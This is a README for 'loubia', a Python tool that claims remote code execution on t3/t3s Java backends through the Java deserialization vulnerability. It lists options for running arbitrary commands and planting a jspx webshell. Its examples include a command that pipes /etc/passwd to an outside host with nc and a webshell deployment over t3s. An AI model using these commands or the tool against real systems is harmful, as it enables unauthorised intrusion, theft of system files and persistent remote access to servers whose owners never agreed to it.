# loubia
Python script that achieves remote code execution on t3 enabled backends. This is possible thanks to (or because of) the Java Unserialize vulnerability.
# Usage
Below is the help of Loubia showing its awesome functionalities:

		Usage: loubia.py hostname port [options]
		Options:
		  --version             show program's version number and exit
		  -h, --help            show this help message and exit
		  -c PAYLOAD, --cmd=PAYLOAD
		                        Command to execute
		  -o OS, --os=OS        Target operating system (unix/win). Default is unix
		  -l SHELL, --shell=SHELL
		                        shell to use (sh/bash). Default is sh
		  -s, --ssl             Use t3s protocol. Default : false
		  -p PROTOCOL, --protocol=PROTOCOL
		                        SSL protocol to use (sslv3/tlsv1/best). Default is
		                        sslv3
		  -w, --webshell        Deploy a jspx webshell
		  -u URL, --url=URL     Deploy the jspx webshell to the target URL path
		                        (webshell name will be URL_.jspx)
		  -v, --verbose         Print verbose output. Default : false

Examples:

Disclosing /etc/passwd to a local listening socket

		./loubia.py 192.168.1.2 7001 -c "cat /etc/passwd | nc 192.168.1.3 6666"
								
Deploying a webshell using bash on t3s

		./loubia.py 192.168.1.2 7002 -s -l bash -w

# Details
For more details see this post http://wtfsec.blogspot.fr/2016/03/loubia-exploitation-of-java-unserialize.html
